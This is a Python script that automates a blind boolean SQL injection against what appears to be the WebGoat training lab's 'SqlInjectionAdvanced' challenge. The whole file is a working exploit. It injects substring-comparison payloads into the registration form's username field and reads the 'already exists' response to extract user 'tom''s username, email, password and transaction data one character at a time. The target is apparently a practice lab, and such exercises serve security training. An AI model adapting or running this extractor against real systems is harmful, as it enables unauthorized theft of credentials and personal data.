import json
import requests
import sys
import os

# Add the parent directory to the Python path for importing config
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import Config

# Load configurations
SESSION_COOKIE = Config.SESSION_COOKIE
SERVER_URL = Config.SERVER_URL

# Main function to fetch data for a specific user using SQL Injection
def dataofuser(tables_and_columns):
    """
    Extract data for user 'tom' from specified tables and columns using SQL injection.
    Args:
        tables_and_columns (dict): Dictionary where keys are table names and values are lists of column names.
    Returns:
        dict: Extracted data organized by table and columns.
    """
    char_set = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789!@#$%^&*()'
    request_headers = {'Cookie': SESSION_COOKIE}

    def get_column_value(table, column, position):
        """
        Extract the value for a specific column and position.
        Args:
            table (str): Table name.
            column (str): Column name.
            position (int): Starting position for extraction.
        Returns:
            str: Extracted value.
        """
        extracted_value = ''
        char_pos = 0

        while True:
            query_payload = (
                "' OR (SELECT substring({}, {}, 1) FROM {} WHERE USERID = 'tom') = '{}' --"
                .format(column, position, table, char_set[char_pos])
            )
            form_data = {
                'username_reg': query_payload,
                'email_reg': 'tom@gmail.com',
                'password_reg': 'x',
                'confirm_password_reg': 'x'
            }

            try:
                response = requests.put(
                    f'{SERVER_URL}/SqlInjectionAdvanced/challenge',
                    headers=request_headers,
                    data=form_data
                )
                json_response = json.loads(response.text)
            except json.JSONDecodeError:
                print(f"Error: Unable to parse JSON. Raw response: {response.text}")
                return None
            except requests.RequestException as error:
                print(f"HTTP request failed: {error}")
                return None

            if "already exists" in json_response.get('feedback', ''):
                extracted_value += char_set[char_pos]
                char_pos = 0
                position += 1
            else:
                char_pos += 1
                if char_pos >= len(char_set):
                    break

        return extracted_value

    def get_row_for_user(table, column_list):
        """
        Extract all column values for the user 'tom' in a given table.
        Args:
            table (str): Table name.
            column_list (list): List of column names.
        Returns:
            dict: Extracted data for the row.
        """
        
        row_details = {}
        for column in column_list:
            value = get_column_value(table, column, 1)
            row_details[column] = value if value else 'NULL'
        return row_details

    user_data = {}
    for table, columns in tables_and_columns.items():
        print(f"Fetching data for user 'tom' from table: {table}")
        row_data = get_row_for_user(table, columns)
        user_data[table] = row_data

    return user_data

# Wrapper function
def fetch_user_data(tables_and_columns):
    """
    Wrapper function to fetch user data.
    Args:
        tables_and_columns (dict): Dictionary with table names as keys and list of columns as values.
    Returns:
        dict: Result containing status and data.
    """
    try:
        user_data = dataofuser(tables_and_columns)
        if not user_data:
            return {"status": "error", "message": "Failed to retrieve user data"}

        formatted_data = []
        for table, row in user_data.items():
            formatted_data.append({
                "table": table,
                "data": row
            })
        return {"status": "success", "data": formatted_data}

    except Exception as e:
        return {"status": "error", "message": str(e)}

# Example usage
if __name__ == "__main__":
    try:
        # Define the tables and columns to query
        tables_and_columns = {
            "users": ["username", "email", "password"],
            "transactions": ["transaction_id", "amount", "timestamp"]
        }

        result = fetch_user_data(tables_and_columns)
        if result["status"] == "success":
            for table_info in result["data"]:
                print(f"\nTable: {table_info['table']}")
                for column, value in table_info["data"].items():
                    print(f"{column}: {value}")
        else:
            print(f"Error: {result['message']}")
    except Exception as e:
        print(f"Unexpected error: {e}")